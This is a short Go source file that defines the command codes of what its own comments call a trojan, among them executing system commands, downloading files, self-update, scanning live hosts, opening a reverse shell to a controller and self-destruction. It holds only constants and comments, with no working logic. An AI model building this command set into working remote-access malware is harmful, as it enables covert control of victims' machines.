package command

type cmd uint16

// command define
const (
	SYSTEMCMD    cmd = 0x0010 + iota // exec system command
	DLFILE                           // download file form somewhere
	UPDATE                           // update trojan self
	GETSYSINFO                       // get system information such as cpu users
	GETPROCINFO                      // get process information
	SCAN                             // scan live host
	SLEEP                            // sleep sometime
	SETHBREQ                         // set heart beat frequence
	REVERSESHELL                     // reverse shell to controller
	DESTROY                          // destroy self
	RESERVE                          // reserve bit
	HEARTBEAT    cmd = 0xFFFF        // heartbeat
)
